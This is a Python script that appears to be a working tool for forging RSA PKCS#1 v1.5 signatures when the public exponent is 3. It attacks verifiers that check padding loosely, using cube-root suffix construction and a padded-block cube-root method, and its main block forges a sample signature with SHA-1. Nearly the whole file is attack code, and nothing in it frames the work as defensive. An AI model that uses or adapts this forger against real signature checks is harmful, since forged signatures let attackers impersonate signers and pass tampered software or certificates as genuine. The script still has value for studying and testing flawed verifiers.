#!/usr/bin/python

import binascii
import hashlib
import gmpy2
import os

from decimal import Decimal, getcontext

HASH_ASN1 = {
'MD5': b'\x30\x20\x30\x0c\x06\x08\x2a\x86\x48\x86\xf7\x0d\x02\x05\x05\x00\x04\x10',
'SHA-1': b'\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14',
'SHA-256': b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20',
'SHA-384': b'\x30\x41\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x02\x05\x00\x04\x30',
'SHA-512': b'\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05\x00\x04\x40',
}

keysize = 1024

class Hash:

	def __init__(self, hashAlg):
		if hashAlg == "MD5":
			self.digestInfo = HASH_ASN1[hashAlg]
			self.digester = hashlib.md5
		elif hashAlg == "SHA-1":
			self.digestInfo = HASH_ASN1[hashAlg]
			self.digester = hashlib.sha1
		elif hashAlg == "SHA-256":
			self.digestInfo = HASH_ASN1[hashAlg]
			self.digester = hashlib.sha256
		elif hashAlg == "SHA-384":
			self.digestInfo = HASH_ASN1[hashAlg]
			self.digester = hashlib.sha384
		elif hashAlg == "SHA-512":
			self.digestInfo = HASH_ASN1[hashAlg]
			self.digester = hashlib.sha512
		else:
			raise Exception("Invalid hash algorithm identifier provided")
	
def getBitAt(idx, val):
  return (val >> idx) & 0x01

def setBitAt(idx, val):
  return val | (0x01 << idx)

def toInt(val):
  return int(val.encode("hex"), 16)

def toBytes(val):
  hexVal = hex(val)[2:-1]
  if len(hexVal) % 2 == 1:
    hexVal = "0"+hexVal
  return hexVal.decode("hex")

class SignatureForger:

	def __init__(self, keysize, hashAlg, method):
		self.keysize = keysize
		self.hashAlg = hashAlg
		self.method = method


	def encodePkcs1Suffix(self, message):
		messageHash = self.hashAlg.digester(message).digest()
		if ord(messageHash[-1]) & 0x01 != 0x01:
			print("Hash value must be uneven. Try a different message")
			exit()
		suffix = "\x00" + self.hashAlg.digestInfo + messageHash
		return suffix
	
	def constructSignatureSuffix(self, suffix):
		signatureSuffix = 1
		for idx in range(len(suffix) * 8):
			if getBitAt(idx, signatureSuffix ** 3) != getBitAt(idx, toInt(suffix)):
				signatureSuffix = setBitAt(idx, signatureSuffix)
		return signatureSuffix

	def addPrefixToSignature(self, signatureSuffix):
		prefix = "\x00\x01"
		prefix += "\xFF"*8
		while True:
			testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
			signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(toBytes(signatureSuffix))] + toBytes(signatureSuffix)
			toCheck = toBytes(toInt(signatureCandidate) ** 3)
			if "\x00" not in toCheck[:-len(toBytes(signatureSuffix))]:
				return signatureCandidate


	def forgeSignature_method1(self, message):
		suffix = self.encodePkcs1Suffix(message)
		signatureSuffix = self.constructSignatureSuffix(suffix)
		signature = self.addPrefixToSignature(signatureSuffix)
		return signature

 
	def nthroot (self, n, A, precision=300):
	    getcontext().prec = precision
	 
	    n = Decimal(n)
	    x_0 = A / n #step 1: make a while guess.
	    x_1 = 1     #need it to exist before step 2
	    while True:
		#step 2:
		x_0, x_1 = x_1, (1 / n)*((n - 1)*x_0 + (A / (x_0 ** (n - 1))))
		if x_0 == x_1:
		    return x_1

	def forgeSignature_method2(self, message, psLength=8):
		prefix = "\x00\x01"
		prefix += "\xFF"*psLength
		suffix = self.encodePkcs1Suffix(message)
		plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
		signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
		return signature

if __name__ == "__main__":
	message = "WhAAASDAatWhatInTheButt"
	signatureForger = SignatureForger(2048, Hash("SHA-1"), 1)
	#signature = signatureForger.forgeSignature_method1(message)
	signature = signatureForger.forgeSignature_method2(message)
	print(hex(toInt(signature) ** 3))
	'''
	output format: raw, hex, base64
	keysize: raw, from public key
	hash algo, md5, sha1, sha256, sha384, sha512
	message to sign: ascii, hex, base64
	'''

